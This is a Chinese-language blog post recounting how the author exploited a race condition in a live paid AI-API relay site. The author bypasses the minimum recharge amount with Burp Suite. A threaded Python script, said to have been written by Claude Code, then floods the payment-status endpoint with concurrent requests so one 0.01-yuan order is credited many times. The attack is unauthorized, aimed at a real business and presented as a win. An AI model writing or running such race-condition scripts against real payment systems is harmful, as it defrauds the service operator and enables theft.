前言

最近我尝试了一下 Claude Code，感觉非常不错。可惜是使用的 Any Router 因为太出圈了导致被打了，很不稳定（写文时是完全不可用状态）。为了稳定，我找了一些其他的付费站；为了省钱，我选择了一些赠送额度的和一个签到赠送额度的站点。

简单测试之后，发现这个站点的签到功能有竞态条件 (Race Condition)。当我开开心心第二天写好脚本开始并发，却收到了全部失败的消息，打开网页发现签到功能下线了。一气之下开始考虑充值，打开页面，感觉很像自己搓的，于是决定看看这里有没有竞态条件。

探索

因为奔着充 ¥0.01 先试试水的目的，所以直接选了自定义。

没想到限制最低充值 2 元。猜测是前端限制，所以打算找一下相关的 event listener。然而由于不太擅长，导致没有找到，最后想到就算绕过前端万一后端也验证也没办法，所以决定直接看后端请求。

简单测试就容易得到，当点击「支付宝支付」或「微信支付」后其请求了 /api/order/getTradeInfo 这一接口：body 有两个参数，分别表示充值金额和支付方式；主要返回两个数据，分别表示二维码 URL 和订单号。我使用 Burp Suite，所以直接通过 Repeater 修改充值金额，发现可以正常创建订单并返回相应信息。

接着发现网页会定期请求 /api/order/queryTradeStatus?outTradeNo={tradeNo}&payWay={payWay} 来判断用户是否完成支付。为了节（shěng）约（qián），我在这一步选择暂不付款。

尝试

不付款的话就没有办法继续探索后续的流程和接口了，所以我选择直接赌它：

  1. 用户支付后更新用户余额/额度的逻辑有竞态条件；
  2. 判断用户支付结果的请求是由前端发起。
    • 如果后端定期请求，不方便我们主动并发。
    • 但写文时似乎又觉得就算后端检查，也不一定完全没机会，只是利用难度增大了。

于是用 Claude Code 帮我写好的并发函数来测试一下：

def send_concurrent_requests(
    url: str,
    method: str,
    headers: dict = {},
    payload: dict = {},
    concurrent_requests: int = 30,
):
    """
    Perform concurrent requests to test for race conditions.
    :param url: The URL to send the requests to.
    :param method: The HTTP method to use (e.g., "POST", "GET").
    :param headers: Headers to include in the request.
    :param payload: Payload to include in the request.
    :param concurrent_requests: Number of concurrent requests to perform.
    :return: A list of responses from the requests.
    """
    import concurrent.futures
    import requests
    import threading

    http_method = getattr(requests, method.lower())
    barrier = threading.Barrier(concurrent_requests)

    def worker():
        barrier.wait()
        if method.lower() in ["post", "put", "patch"]:
            return http_method(url, headers=headers, json=payload)
        else:
            return http_method(url, headers=headers, params=payload)

    with concurrent.futures.ThreadPoolExecutor(max_workers=concurrent_requests) as executor:
        futures = [executor.submit(worker) for _ in range(concurrent_requests)]
        results = [future.result() for future in concurrent.futures.as_completed(futures)]

    return results

结果非常 Amazing 啊！我选择使用支付宝支付 ¥0.01，由于有百次立减优惠减免了 ¥0.01（相当于白嫖），而网站中的余额增加了 $0.2+（该网站充值美元/人民币比例 1:1）！
